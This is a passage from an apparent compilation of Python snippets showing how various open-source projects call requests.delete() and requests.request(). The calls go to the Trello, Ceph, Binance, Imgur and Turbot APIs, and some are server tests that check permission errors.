        resp = requests.delete("https://trello.com/1/cards/%s" % (card_id_or_shortlink), params=dict(key=self._apikey, token=self._token), data=None)
        resp.raise_for_status()
        return resp.json() 
**************************************
def delete_attachment_idAttachment(self, idAttachment, card_id_or_shortlink):
        resp = requests.delete("https://trello.com/1/cards/%s/attachments/%s" % (card_id_or_shortlink, idAttachment), params=dict(key=self._apikey, token=self._token), data=None)
        resp.raise_for_status()
        return resp.json() 
**************************************
def delete_checklist_idChecklist(self, idChecklist, card_id_or_shortlink):
        resp = requests.delete("https://trello.com/1/cards/%s/checklists/%s" % (card_id_or_shortlink, idChecklist), params=dict(key=self._apikey, token=self._token), data=None)
        resp.raise_for_status()
        return resp.json() 
**************************************
def delete_label_color(self, color, card_id_or_shortlink):
        resp = requests.delete("https://trello.com/1/cards/%s/labels/%s" % (card_id_or_shortlink, color), params=dict(key=self._apikey, token=self._token), data=None)
        resp.raise_for_status()
        return resp.json() 
**************************************
def delete_membersVoted_idMember(self, idMember, card_id_or_shortlink):
        resp = requests.delete("https://trello.com/1/cards/%s/membersVoted/%s" % (card_id_or_shortlink, idMember), params=dict(key=self._apikey, token=self._token), data=None)
        resp.raise_for_status()
        return resp.json() 
**************************************
def delete(self, idOrg_or_name):
        resp = requests.delete("https://trello.com/1/organizations/%s" % (idOrg_or_name), params=dict(key=self._apikey, token=self._token), data=None)
        resp.raise_for_status()
        return resp.json() 
**************************************
def delete_member_idMember(self, idMember, idOrg_or_name):
        resp = requests.delete("https://trello.com/1/organizations/%s/members/%s" % (idOrg_or_name, idMember), params=dict(key=self._apikey, token=self._token), data=None)
        resp.raise_for_status()
        return resp.json() 
**************************************
def delete_checkItem_idCheckItem(self, idCheckItem, idChecklist):
        resp = requests.delete("https://trello.com/1/checklists/%s/checkItems/%s" % (idChecklist, idCheckItem), params=dict(key=self._apikey, token=self._token), data=None)
        resp.raise_for_status()
        return resp.json() 
**************************************
def delete_member_idMember(self, idMember, board_id):
        resp = requests.delete("https://trello.com/1/boards/%s/members/%s" % (board_id, idMember), params=dict(key=self._apikey, token=self._token), data=None)
        resp.raise_for_status()
        return resp.json() 
**************************************
def delete_pool(self, cluster, pool_id, asserts_in=None):
        """ Delete Ceph pool.

        Name:        "delete_pool",
        Method:      "DELETE",
        Pattern:     ":cluster_id:/CephDeletePool",

        Args:
            cluster (str): Cluster ID
            pool_id (str): Pool ID
            asserts_in (dict): assert values for this call and this method
        """
        pattern = "{}/CephDeletePool".format(cluster)
        pool_data = {"Pool.pool_id": pool_id}
        response = requests.delete(
            CONF.config["usmqe"]["api_url"] + pattern,
            json=pool_data,
            auth=self._auth)
        asserts_in = asserts_in or {
            "cookies": None,
            "ok": True,
            "reason": 'Accepted',
            "status": 202}
        self.print_req_info(response)
        self.check_response(response, asserts_in)
        return response.json() 
**************************************
def delete_rbd(self, cluster, pool_id, name, asserts_in=None):
        """ Delete RBD in Ceph pool.

        Name:        "delete_rbd",
        Method:      "DELETE",
        Pattern:     ":cluster_id:/CephDeleteRbd",

        Args:
            cluster (str): Cluster ID
            pool_id (str): Pool ID
            name (str): RBD name
            asserts_in (dict): assert values for this call and this method
        """
        pattern = "{}/CephDeleteRbd".format(cluster)
        pool_data = {"Rbd.pool_id": pool_id, "Rbd.name": name}
        response = requests.delete(
            CONF.config["usmqe"]["api_url"] + pattern,
            json=pool_data,
            auth=self._auth)
        asserts_in = asserts_in or {
            "cookies": None,
            "ok": True,
            "reason": 'Accepted',
            "status": 202}
        self.print_req_info(response)
        self.check_response(response, asserts_in)
        return response.json() 
**************************************
def delete_ecprofile(self, cluster, name, asserts_in=None):
        """ Delete EC profile.

        Name:        "delete_ecprofile",
        Method:      "DELETE",
        Pattern:     ":cluster_id:/CephDeleteECProfile",

        Args:
            cluster (str): Cluster ID
            name (str): EC profile name
            asserts_in (dict): assert values for this call and this method
        """
        pattern = "{}/CephDeleteECProfile".format(cluster)
        pool_data = {"ECProfile.name": name}
        response = requests.delete(
            CONF.config["usmqe"]["api_url"] + pattern,
            json=pool_data,
            auth=self._auth)
        asserts_in = asserts_in or {
            "cookies": None,
            "ok": True,
            "reason": 'Accepted',
            "status": 202}
        self.print_req_info(response)
        self.check_response(response, asserts_in)
        return response.json() 
**************************************
def logout(auth, asserts_in=None):
    """
    Logout Tendrl user.

    Args:
        asserts_in: assert values for this call and this method
        auth: TendrlAuth object (defines bearer token header)
    """
    pattern = "logout"
    request = requests.delete(
        CONF.config["usmqe"]["api_url"] + pattern,
        auth=auth)
    ApiBase.print_req_info(request)
    ApiBase.check_response(request, asserts_in) 
**************************************
def delete(self, path=None):
        method = 'delete'
        prefix, call = self.parse_path(path)
        data = request.data
        address = request.remote_addr
        handler = self.handlers[method]
        ack, reply = handler((address, prefix, call, data))
        code = 200 if ack else 500
        resp = make_response(reply, code)
        resp.headers['Content-Type'] = self.content_type
        return resp 
**************************************
def __init__(self, url):
        self.handlers = {
            'post':self.post_handler,
            'put': self.put_handler,
            'delete': self.delete_handler,
        }
        self.server = WebServer(url, self.handlers)
        # self.playground = Playground()
        self.playing = None
        self.running_playground = False
        self.in_queue = MQueue()
        self.out_queue = MQueue()
        self._ids = 0
        self.in_q = Queue()
        self.client = WebClient() 
**************************************
def make_api_call(method, url, token, payload = None, parameters = None):
    # Send these headers with all API calls
    headers = { 'User-Agent' : 'django-tutorial/1.0',
                'Authorization' : 'Bearer {0}'.format(token),
                'Accept' : 'application/json'}

    # Use these headers to instrument calls. Makes it easier
    # to correlate requests and responses in case of problems
    # and is a recommended best practice.
    request_id = str(uuid.uuid4())
    instrumentation = { 'client-request-id' : request_id,
                        'return-client-request-id' : 'true' }

    headers.update(instrumentation)

    response = None 

    payload = {
              "Subject": "Discuss the Calendar REST API",
              "Body": {
                "ContentType": "HTML",
                "Content": "I think it will meet our requirements!"
              },
              "Start": {
                  "DateTime": "2014-04-04T18:00:00",
                  "TimeZone": "Pacific Standard Time"
              },
              "End": {
                  "DateTime": "2014-04-04T19:00:00",
                  "TimeZone": "Pacific Standard Time"
              },
              "Attendees": [
                {
                  "EmailAddress": {
                    "Address": "[email protected]",
                    "Name": "Janet Schorr"
                  },
                  "Type": "Required"
                }
              ]
            }

    if (method.upper() == 'GET'):
        response = requests.get(url, headers = headers, params = parameters)
    elif (method.upper() == 'DELETE'):
        response = requests.delete(url, headers = headers, params = parameters)
    elif (method.upper() == 'PATCH'):
        headers.update({ 'Content-Type' : 'application/json' })
        response = requests.patch(url, headers = headers, data = json.dumps(payload), params = parameters)
    elif (method.upper() == 'POST'):
        headers.update({ 'Content-Type' : 'application/json' })
        response = requests.post(url, headers = headers, data = json.dumps(payload), params = parameters)

    return response 
**************************************
def delete_domain(self,d_id):
    """
    Deletes the domain associated with the supplied CRITs GUID.
    Depending on the type of error, the function will either exit or return False.

    :param d_id: The CRITs GUID for the domain to be deleted.
    :type d_id: str
    :returns: boolean
    """

    if d_id == None or d_id == "":
      print "A domain ID must be supplied to delete_domain!"
      exit(1)

    url = self.CRITs_URL + 'domains/' + d_id + '/' + '?username=' + self.username + '&api_key=' + self.api_key

    data = {} 

    try:
      r = requests.delete(url, data=data, verify=self.verify)
    except requests.exceptions.ConnectionError as e:
      print "delete_domain error: Could not connect to " + url
      exit(1)
    except requests.exceptions.Timeout as e:
      print "delete_domain error: Timeout connecting to " + url
      exit(1)

    #if self.debug:
    #  print ">>>delete_domain response<<<\n"
    #  print r.text

    if r.text != None and r.text != "":
      j = json.loads(r.text)
    else:
      j = {}

    if r.status_code == 200:
      return_code = int(j['return_code'])
      if return_code == 0:
        if self.debug:
          print "Successfully deleted "+ d_id
        return (True)
      else:
        print "Error deleting " + d_id
        return (False)
    elif self.debug:
      print "Error with domain delete:" + d_id + " : " + str(r.status_code)

    return (False) 
**************************************
def _request(self, method, path, query=False, data=False):
        """
        Do the request

        :param method: choose the method to use (post, put or delete)
        :type method: str

        :param path: choose the path to use
        :type path: str

        :param query: choose the query to use
        :type query: str

        :param data: the payload for the post method
        :type data: str

        :return: the response
        :rtype: str or False
        """
        requests_headers = {'Accept': 'application/json',
                            'User-Agent': 'oliver-zehentleitner/unicorn-binance-websocket-api/' +
                                          self.unicorn_binance_websocket_api_version,
                            'X-MBX-APIKEY': str(self.api_key)}
        if query is not False:
            uri = self.restful_base_uri + path + "?" + query
        else:
            uri = self.restful_base_uri + path
        try:
            if method == "post":
                request_handler = requests.post(uri, headers=requests_headers)
            elif method == "put":
                request_handler = requests.put(uri, headers=requests_headers, data=data)
            elif method == "delete":
                request_handler = requests.delete(uri, headers=requests_headers)
            else:
                request_handler = False
        except requests.exceptions.ConnectionError as error_msg:
            logging.critical("BinanceWebSocketApiRestclient->_request() - error_msg: " + str(error_msg))
            return False
        except socket.gaierror as error_msg:
            logging.critical("BinanceWebSocketApiRestclient->_request() - error_msg: " + str(error_msg))
            return False
        if request_handler.status_code == "418":
            logging.critical("BinanceWebSocketApiRestclient->_request() received status_code 418 from binance! You got"
                             "banned from the binance api! Read this: https://github.com/binance-exchange/binance-"
                             "official-api-sphinx/blob/master/rest-api.md#limits")
        elif request_handler.status_code == "429":
            logging.critical("BinanceWebSocketApiRestclient->_request() received status_code 429 from binance! Back off"
                             "or you are going to get banned! Read this: https://github.com/binance-exchange/binance-"
                             "official-api-sphinx/blob/master/rest-api.md#limits")

        try:
            respond = request_handler.json()
        except simplejson.errors.JSONDecodeError as error_msg:
            logging.critical(str(error_msg))
            return False
        self.binance_api_status['weight'] = request_handler.headers.get('X-MBX-USED-WEIGHT')
        self.binance_api_status['timestamp'] = time.time()
        self.binance_api_status['status_code'] = request_handler.status_code
        request_handler.close()
        return respond 
**************************************
def self_enroll(skip_notify=False):
    assert os.getuid() == 0 and os.getgid() == 0, "Can self-enroll only as root"

    from certidude import const, config
    common_name = const.FQDN
    os.umask(0o0177)

    try:
        path, buf, cert, signed, expires = get_signed(common_name)
        self_public_key = asymmetric.load_public_key(path)
        private_key = asymmetric.load_private_key(config.SELF_KEY_PATH)
    except FileNotFoundError: # certificate or private key not found
        click.echo("Generating private key for frontend: %s" % config.SELF_KEY_PATH)
        with open(config.SELF_KEY_PATH, 'wb') as fh:
            if public_key.algorithm == "ec":
                self_public_key, private_key = asymmetric.generate_pair("ec", curve=public_key.curve)
            elif public_key.algorithm == "rsa":
                self_public_key, private_key = asymmetric.generate_pair("rsa", bit_size=public_key.bit_size)
            else:
                raise NotImplemented("CA certificate public key algorithm %s not supported" % public_key.algorithm)
            fh.write(asymmetric.dump_private_key(private_key, None))
    else:
        now = datetime.utcnow()
        if now + timedelta(days=1) < expires:
            click.echo("Certificate %s still valid, delete to self-enroll again" % path)
            return

    builder = CSRBuilder({"common_name": common_name}, self_public_key)
    request = builder.build(private_key)
    pid = os.fork()
    if not pid:
        from certidude import authority, config
        from certidude.common import drop_privileges
        drop_privileges()
        assert os.getuid() != 0 and os.getgid() != 0
        path = os.path.join(config.REQUESTS_DIR, common_name + ".pem")
        click.echo("Writing certificate signing request for frontend: %s" % path)
        with open(path, "wb") as fh:
            fh.write(pem_armor_csr(request)) # Write CSR with certidude permissions
        authority.sign(common_name, skip_notify=skip_notify, skip_push=True, overwrite=True, profile=config.PROFILES["srv"])
        click.echo("Frontend certificate signed")
        sys.exit(0)
    else:
        os.waitpid(pid, 0)
        os.system("systemctl reload nginx") 
**************************************
def testDelete(self):
        # test Delete
        domain = self.base_domain + "/testDelete.h5"
        helper.setupDomain(domain)
        print("testDelete", domain)
        headers = helper.getRequestHeaders(domain=domain)

        # get domain
        req = helper.getEndpoint() + '/'
        rsp = requests.get(req, headers=headers)
        rspJson = json.loads(rsp.text)
        self.assertTrue("root" in rspJson)

        # create a new dataset
        req = helper.getEndpoint() + '/datasets'
        rsp = requests.post(req, headers=headers)
        data = { "type": "H5T_IEEE_F32LE" }
        req = self.endpoint + '/datasets'
        rsp = requests.post(req, data=json.dumps(data), headers=headers)
        self.assertEqual(rsp.status_code, 201)
        rspJson = json.loads(rsp.text)
        self.assertEqual(rspJson["attributeCount"], 0)
        dset_id = rspJson["id"]
        self.assertTrue(helper.validateId(dset_id))


        # verify we can do a get on the new dataset
        req = helper.getEndpoint() + '/datasets/' + dset_id
        rsp = requests.get(req, headers=headers)
        self.assertEqual(rsp.status_code, 200)
        rspJson = json.loads(rsp.text)
        self.assertTrue("id" in rspJson)
        self.assertEqual(rspJson["id"], dset_id)


        # try DELETE with user who doesn't have create permission on this domain
        headers = helper.getRequestHeaders(domain=domain, username="test_user2")
        rsp = requests.delete(req, headers=headers)
        self.assertEqual(rsp.status_code, 403) # forbidden

        # try to do a DELETE with a different domain (should fail)
        another_domain = helper.getParentDomain(domain)
        headers = helper.getRequestHeaders(domain=another_domain)
        req = helper.getEndpoint() + '/datasets/' + dset_id
        rsp = requests.delete(req, headers=headers)
        self.assertEqual(rsp.status_code, 400)

        # delete the new dataset
        headers = helper.getRequestHeaders(domain)
        rsp = requests.delete(req, headers=headers)
        self.assertEqual(rsp.status_code, 200)
        rspJson = json.loads(rsp.text)
        self.assertTrue(rspJson is not None)

        # a get for the dataset should now return 410 (GONE)
        rsp = requests.get(req, headers=headers)
        self.assertEqual(rsp.status_code, 410) 
**************************************
def testDelete(self):
        # test Delete
        print("testDelete", self.base_domain)
        headers = helper.getRequestHeaders(domain=self.base_domain)

        # get domain
        req = helper.getEndpoint() + '/'
        rsp = requests.get(req, headers=headers)
        rspJson = json.loads(rsp.text)
        self.assertTrue("root" in rspJson)
        root_id = rspJson["root"]

        req = helper.getEndpoint() + '/groups'

        # create a new group
        rsp = requests.post(req, headers=headers)
        self.assertEqual(rsp.status_code, 201)
        rspJson = json.loads(rsp.text)
        self.assertTrue("id" in rspJson)
        group_id = rspJson["id"]
        self.assertTrue(helper.validateId(group_id))

        # verify we can do a get on the new group
        req = helper.getEndpoint() + '/groups/' + group_id
        rsp = requests.get(req, headers=headers)
        self.assertEqual(rsp.status_code, 200)
        rspJson = json.loads(rsp.text)
        self.assertTrue("id" in rspJson)
        self.assertEqual(rspJson["id"], group_id)
        self.assertTrue("root" in rspJson)
        self.assertTrue(rspJson["root"] != group_id)
        self.assertTrue("domain" in rspJson)
        #self.assertEqual(rspJson["domain"], self.base_domain)  #TBD

        # try DELETE with user who doesn't have create permission on this domain
        headers = helper.getRequestHeaders(domain=self.base_domain, username="test_user2")
        rsp = requests.delete(req, headers=headers)
        self.assertEqual(rsp.status_code, 403) # forbidden

        # try to do a DELETE with a different domain (should fail)
        another_domain = helper.getParentDomain(self.base_domain)
        headers = helper.getRequestHeaders(domain=another_domain)
        req = helper.getEndpoint() + '/groups/' + group_id
        rsp = requests.delete(req, headers=headers)
        self.assertEqual(rsp.status_code, 400)

        # delete the new group
        headers = helper.getRequestHeaders(domain=self.base_domain)
        rsp = requests.delete(req, headers=headers)
        self.assertEqual(rsp.status_code, 200)
        rspJson = json.loads(rsp.text)
        self.assertTrue(rspJson is not None)

        # a get for the group should now return 410 (GONE)
        rsp = requests.get(req, headers=headers)
        self.assertEqual(rsp.status_code, 410)

        # try deleting the root group
        req = helper.getEndpoint() + '/groups/' + root_id
        rsp = requests.delete(req, headers=headers)
        self.assertEqual(rsp.status_code, 403)  # Forbidden 
**************************************
def testCreateLinkedDomain(self):
        target_domain = self.base_domain + "/target_domain.h5"
        print("testCreateLinkedDomain", target_domain)
        headers = helper.getRequestHeaders(domain=target_domain)
        req = helper.getEndpoint() + '/'

        rsp = requests.put(req, headers=headers)
        self.assertEqual(rsp.status_code, 201)
        rspJson = json.loads(rsp.text)
        for k in ("root", "owner", "acls", "created", "lastModified"):
             self.assertTrue(k in rspJson)

        root_id = rspJson["root"]

        # do a get on the new domain
        rsp = requests.get(req, headers=headers)
        self.assertEqual(rsp.status_code, 200)
        rspJson = json.loads(rsp.text)
        for k in ("root", "owner"):
             self.assertTrue(k in rspJson)
        # we should get the same value for root id
        self.assertEqual(root_id, rspJson["root"])

        # create new domain linked with the existing root
        linked_domain = self.base_domain + "/linked_domain.h5"
        print("testCreateLinkedDomain - linked domain", linked_domain)
        headers = helper.getRequestHeaders(domain=linked_domain)
        body = {"linked_domain": target_domain }
        rsp = requests.put(req, data=json.dumps(body), headers=headers)

        self.assertEqual(rsp.status_code, 201)
        rspJson = json.loads(rsp.text)
        for k in ("root", "owner", "acls", "created", "lastModified"):
             self.assertTrue(k in rspJson)
        self.assertEqual(rspJson["root"], root_id)

        # delete the target domain but keep the root
        headers =  helper.getRequestHeaders(domain=target_domain)
        body = { "keep_root": 1}
        rsp = requests.delete(req, data=json.dumps(body), headers=headers)
        self.assertEqual(rsp.status_code, 200)

        # verify we can access the root group under the linked domain
        headers = helper.getRequestHeaders(domain=linked_domain)
        root_req =  helper.getEndpoint() + "/groups/" + root_id
        rsp = requests.get(root_req, headers=headers)
        self.assertEqual(rsp.status_code, 200) 
**************************************
def testDeleteFolderWithChildren(self):

        folder_name = "testDeleteFolder"
        domain_name = "myfile"
        domain = self.base_domain + "/" + folder_name
        print("testCreateFolder", domain)
        headers = helper.getRequestHeaders(domain=domain)
        req = helper.getEndpoint() + '/'
        body = {"folder": True}
        rsp = requests.put(req, data=json.dumps(body), headers=headers)
        self.assertEqual(rsp.status_code, 201)
        rspJson = json.loads(rsp.text)
        for k in ("owner", "acls", "created", "lastModified"):
             self.assertTrue(k in rspJson)
        self.assertFalse("root" in rspJson)  # no root -> folder

        # verify that putting the same domain again fails with a 409 error
        rsp = requests.put(req, data=json.dumps(body), headers=headers)
        self.assertEqual(rsp.status_code, 409)

        # do a get on the new folder
        rsp = requests.get(req, headers=headers)
        self.assertEqual(rsp.status_code, 200)
        rspJson = json.loads(rsp.text)

        self.assertTrue("owner" in rspJson)
        self.assertTrue("class" in rspJson)
        self.assertEqual(rspJson["class"], "folder")

        # create a child domain
        domain = self.base_domain + "/" + folder_name + "/" + domain_name
        headers = helper.getRequestHeaders(domain=domain)
        rsp = requests.put(req, headers=headers)
        self.assertEqual(rsp.status_code, 201)

        # try delete the folder
        domain = self.base_domain + "/" + folder_name
        headers = helper.getRequestHeaders(domain=domain)
        req = helper.getEndpoint() + '/'
        body = {"folder": True}
        rsp = requests.delete(req, headers=headers)
        # should get 409
        self.assertEqual(rsp.status_code, 409)

        # delete the child domain
        domain = self.base_domain + "/" + folder_name + "/" + domain_name
        headers = helper.getRequestHeaders(domain=domain)
        rsp = requests.delete(req, headers=headers)
        self.assertEqual(rsp.status_code, 200)

        # try delete the folder
        domain = self.base_domain + "/" + folder_name
        headers = helper.getRequestHeaders(domain=domain)
        req = helper.getEndpoint() + '/'
        body = {"folder": True}
        rsp = requests.delete(req, headers=headers)
        self.assertEqual(rsp.status_code, 200) 
**************************************
def send_request(url, params=None, method='GET', data_field='data',
                 authentication=None, verify=True):
    # TODO figure out if there is a way to minimize this
    # TODO Add error checking
    params = to_imgur_format(params)
    # We may need to add more elements to the header later. For now, it seems
    # the only thing in the header is the authentication
    headers = authentication
    # NOTE I could also convert the returned output to the correct object here.
    # The reason I don't is that some queries just want the json, so they can
    # update an existing object. This we do with lazy evaluation. Here we
    # wouldn't know that, although obviously we could have a "raw" parameter
    # that just returned the json. Dunno. Having parsing of the returned output
    # be done here could make the code simpler at the highest level. Just
    # request an url with some parameters and voila you get the object back you
    # wanted.
    is_succesful_request = False
    tries = 0
    while not is_succesful_request and tries <= MAX_RETRIES:
        if method == 'GET':
            resp = requests.get(url, params=params, headers=headers,
                                verify=verify)
        elif method == 'POST':
            resp = requests.post(url, params, headers=headers, verify=verify)
        elif method == 'PUT':
            resp = requests.put(url, params, headers=headers, verify=verify)
        elif method == 'DELETE':
            resp = requests.delete(url, headers=headers, verify=verify)
        if resp.status_code in RETRY_CODES or resp.content == "":
            tries += 1
        else:
            is_succesful_request = True
    content = resp.json()
    if data_field is not None:
        content = content[data_field]
    if not resp.ok:
        try:
            error_msg = "Imgur ERROR message: {0}".format(content['error'])
            print(error_msg)
            print("-" * len(error_msg))
        except Exception:
            pass
        resp.raise_for_status()
    ratelimit_info = dict((k, int(v)) for (k, v) in resp.headers.items()
                          if k.startswith('x-ratelimit'))
    return content, ratelimit_info 
**************************************
def __request_requests(self, url, method, data=None):
        out = self.empty_json
        if isinstance(data, dict):
            data = json.dumps(data)
        elif data:
            try:
                data = json.loads(data)
            except ValueError:
                print "Input not a valid JSON document"
                return 400, "Input not a valid JSON document", out
        try:
            if method == 'GET':
                return _get_requests(url, headers=self.headers,
                                     auth=(self.username, self.password),
                                     timeout=self.timeout)
            elif method == 'PUSH':
                return _post_requests(url, data=data, headers=self.headers,
                                      auth=(self.username, self.password),
                                      timeout=self.timeout)
            elif method == 'DELETE':
                r = requests.delete(url, headers=self.headers,
                                    auth=(self.username, self.password),
                                    timeout=self.timeout)
            elif method == 'PUT':
                r = requests.put(url, data=data, headers=self.headers,
                                 auth=(self.username, self.password),
                                 timeout=self.timeout)
            elif method == 'PATCH':
                r = requests.patch(url, data=data, headers=self.headers,
                                   auth=(self.username, self.password),
                                   timeout=self.timeout)
        except requests.Timeout as e:
            print "Timeout for URL %s: %s" % (url,e,)
            print "Headers: %s" % (str(self.headers),)
            return 400, "Timeout for url %s: %s" % (url,e,), out
        except requests.ProxyError as e:
            print "ProxyError for URL %s: %s" % (url,e,)
            print "Headers: %s" % (str(self.headers),)
            return 400, "ProxyError for url %s: %s" % (url,e,), out
        except requests.SSLError as e:
            print "SSLError for URL %s: %s" % (url,e,)
            print "Headers: %s" % (str(self.headers),)
            return 400, "SSLError for url %s: %s" % (url,e,), out
        except requests.ConnectionError as e:
            print "ConnectionError for URL %s: %s" % (url,e,)
            print "Headers: %s" % (str(self.headers),)
            return 400, "ConnectionError for url %s: %s" % (url,e,), out
        except requests.HTTPError as e:
            print "HTTPError for URL %s: %s" % (url,e,)
            print "Headers: %s" % (str(self.headers),)
            return 400, "HTTPError for url %s: %s" % (url,e,), out
        except requests.RequestException as e:
            print "RequestException for URL %s: %s" % (url,e,)
            print "Headers: %s" % (str(self.headers),)
            return 400, "RequestException for url %s: %s" % (url,e,), out
        return r.status_code, "OK", r.json() 

Python requests.request() Examples

**************************************
def get_aws_access_key(turbot_api_access_key, turbot_api_secret_key, turbot_host_certificate_verification, turbot_host, turbot_account, turbot_user_id, api_version):
    """ Gets the federated access keys for a specified account

    :return: Returns the access key, secret key and session token for an account"""
    api_method = "POST"
    api_url = "/api/%s/accounts/%s/users/%s/awsCredentials" % (api_version, turbot_account, turbot_user_id)
    response = requests.request(
        api_method,
        urllib.parse.urljoin(turbot_host, api_url),
        auth=(turbot_api_access_key, turbot_api_secret_key),
        verify=turbot_host_certificate_verification,
        headers={
            'content-type': "application/json",
            'cache-control': "no-cache"
        }
    )

    responseObj = json.loads(response.text)

    akey = responseObj['accessKeyId']
    skey = responseObj['secretAccessKey']
    token = responseObj['sessionToken']

    return (akey, skey, token) 
**************************************
def send(self,method,url,params=None,data=None,headers=None):
		if headers is None: headers={}
		headers['User-Agent'] = Request.agent
		try:
			session = requests.Session()
			req = urllib3.disable_warnings(
				urllib3.exceptions.InsecureRequestWarning
				)
			req = requests.request(
				method = method.upper(),
				url = url,
				params = params,
				data = data,
				allow_redirects = True,
				verify = False  )
			return req
		except Exception as e:
			exit(warn('Failed to establish a new connection')) 
**************************************
def request(method, path, params=None):
        url = api.url.rstrip("/") + path
        data = {"params" if method in ["GET", "DELETE"] else "json": params}
        resp = requests.request(method, url, auth=(api.private_key, ""), **data)

        json = resp.json()
        if resp.status_code == 200:
            return json
        error = json.get("error")
        if error is None:
            raise api.SecurionPayException("Internal error", None, json, None, None)
        raise api.SecurionPayException(
            error.get("type"),
            error.get("code"),
            error.get("message"),
            error.get("charge_id"),
            error.get("blacklist_rule_id"),
        ) 
**************************************
def parse_image(image):
    """Parse the image smartly and return metadata for request.

    First check whether the image is a URL or a file path or a file-like object
    and return corresponding metadata.

    Args:
        image: A URL or a file path or a file-like object represents an image.

    Returns:
        a three-item tuple consist of HTTP headers, binary data and json data
        for POST.
    """
    if hasattr(image, 'read'):  # When image is a file-like object.
        headers = {'Content-Type': 'application/octet-stream'}
        data = image.read()
        return headers, data, None
    elif os.path.isfile(image):  # When image is a file path.
        headers = {'Content-Type': 'application/octet-stream'}
        data = open(image, 'rb').read()
        return headers, data, None
    else:  # Defailt treat it as a URL (string).
        headers = {'Content-Type': 'application/json'}
        json = {'url': image}
        return headers, None, json 
**************************************
def push(self, url, method, fail_on_error, envelope, payload):  # pylint: disable=arguments-differ
        if isinstance(payload, (dict, list, tuple)):
            try:
                payload = json.dumps(payload)
            except:  # pylint: disable=bare-except
                pass
        resp = requests.request(method, url, data=str(payload))
        if fail_on_error and not 200 <= resp.status_code <= 299:
            raise PushExecutionError(
                "{method} of '{url}' failed with status code = '{status_code}'".format(
                    method=method,
                    url=url,
                    status_code=resp.status_code
                )
            )
        if not self.provide_response:
            return {'data': payload, **envelope} if envelope else payload

        try:
            return dict(status_code=resp.status_code, is_json=True, data=resp.json())
        except ValueError:
            # No valid json, try text
            return dict(status_code=resp.status_code, is_json=False, data=resp.text) 
**************************************
def get_response(args, config_dir):
    """Send the request and return a `request.Response`."""

    requests_kwargs = get_requests_kwargs(args)

    if args.debug:
        sys.stderr.write('\n>>> requests.request(%s)\n\n'
                         % pformat(requests_kwargs))

    if not args.session and not args.session_read_only:
        response = requests.request(**requests_kwargs)
    else:
        response = sessions.get_response(
            args=args,
            config_dir=config_dir,
            session_name=args.session or args.session_read_only,
            requests_kwargs=requests_kwargs,
            read_only=bool(args.session_read_only),
        )

    return response 
**************************************
def refresh_token(self):
        """
        Refresh the current token set in the module.

        Returns the new obtained valid token for the API.
        """
        self._set_token_header()

        response = requests.request(
            'GET', self._get_complete_url('refresh_token'),
            headers=self._headers)

        response.raise_for_status()
        jsn = response.json()
        if 'token' in jsn:
            from . import KEYS
            KEYS.API_TOKEN = jsn['token']
            return KEYS.API_TOKEN
        return '' 
**************************************
def _request(self, method, path, params=None, payload=None, forceNewToken=False, cleanJson = True):
        self._set_token_header(forceNewToken)
        
        url = self._get_complete_url(path)

        response = requests.request(
            method, url, params=params, 
            data=json.dumps(payload) if payload else payload,
            headers=self._headers)
        
        if response.status_code == 200:
            response.encoding = 'utf-8'
            jsn = response.json()
            if cleanJson and 'data' in jsn:
                return jsn['data']
            return jsn
        elif not forceNewToken:
            return self._request(method=method, path=path, params=params, payload=payload, forceNewToken=True)
        try:
            raise Exception(response.json()['Error'])
        except:
            response.raise_for_status() 
**************************************
def _authenticate(self):
        if self.auth_result:
            return self.auth_result

        auth_uri = self.auth_uri
        headers = {'X-Auth-User': self.auth_user,
                   'X-Auth-Key': self.auth_key,
                   'X-Auth-Project-Id': self.project_id}
        response = self.request(auth_uri,
                                headers=headers)

        http_status = response.status_code
        LOG.debug("%(auth_uri)s => code %(http_status)s",
                  {'auth_uri': auth_uri, 'http_status': http_status})

        if http_status == 401:
            raise OpenStackApiAuthenticationException(response=response)

        self.auth_result = response.headers
        return self.auth_result 
**************************************
def _do_request(self, method, action_url, body, headers):
        # Connects to the server and issues a request.
        # :returns: result data
        # :raises: IOError if the request fails

        action_url = "https://%s:%s%s/%s" % (self.host, self.port,
                                             self.api_url, action_url)
        try:
            res = requests.request(method, action_url, data=body,
                                   headers=headers, cert=self.cert,
                                   verify=self.verify)
            status_code = res.status_code
            if status_code in (requests.codes.OK,
                               requests.codes.CREATED,
                               requests.codes.ACCEPTED,
                               requests.codes.NO_CONTENT):
                try:
                    return requests.codes.OK, jsonutils.loads(res.text)
                except (TypeError, ValueError):
                    return requests.codes.OK, res.text
            return status_code, None

        except requests.exceptions.RequestException:
            return IOError, None 
**************************************
def token_request(self, payload):
        """Request Authorization Payload."""
        headers = {"content-type": "application/json"}
        response = requests.request(
            "POST",
            URL_OAUTH_TOKEN,
            json=payload,
            headers=headers
            )

        LOGGER.debug("Token Payload: %s", payload)
        LOGGER.debug("Token Response: %s", response.text)

        # Check for response errors.
        _response_error(
            f"Can't get token for user {self._creds['username']}",
            response
            )

        return json.loads(response.text)["data"][0] 
**************************************
def get_devices(self):
        """Return all available devices from Flume API."""
        url = f"https://api.flumetech.com/users/\
        {self._flume_auth.user_id}/devices"

        querystring = {"user": "false", "location": "false"}
        response = requests.request(
            "GET",
            url,
            headers=self._flume_auth.authorization_header,
            params=querystring
            )

        LOGGER.debug("get_devices Response: %s", response.text)

        # Check for response errors.
        _response_error("Impossible to retreive devices", response)

        return json.loads(response.text)["data"] 
**************************************
def get_cluster_id(turbot_host, turbot_api_access_key, turbot_api_secret_key, turbot_host_certificate_verification):
    """ Gets the cluster id
    # TODO: put this in cluster.py
    """
    api_method = "GET"
    api_url = "/api/v1/cluster"

    response = requests.request(
        api_method,
        urllib.parse.urljoin(turbot_host, api_url),
        auth=(turbot_api_access_key, turbot_api_secret_key),
        verify=turbot_host_certificate_verification,
        headers={
            'content-type': "application/json",
            'cache-control': "no-cache"
        }
    )

    # Convert the response JSON into a Python object
    responseObj = json.loads(response.text)
    urn = responseObj['urn']

    return urn 
**************************************
def get_option_list(turbot_host, turbot_api_access_key, turbot_api_secret_key, turbot_host_certificate_verification, urn):
    """ Gets the turbot option list

    """
    api_method = "GET"
    api_url = "/api/v1/resources/" + urn + "/options/"

    response = requests.request(
        api_method,
        urllib.parse.urljoin(turbot_host, api_url),
        auth=(turbot_api_access_key, turbot_api_secret_key),
        verify=turbot_host_certificate_verification,
        headers={
            'content-type': "application/json",
            'cache-control': "no-cache"
        }
    )

    options_obj = json.loads(response.text)

    return options_obj['items'] 
**************************************
def get_set_option(turbot_host, turbot_api_access_key, turbot_api_secret_key, turbot_host_certificate_verification, urn, set_option):
    """ gets the set options"""

    api_method = "GET"
    api_url = "/api/v1/resources/" + urn + "/options/" + set_option


    response = requests.request(
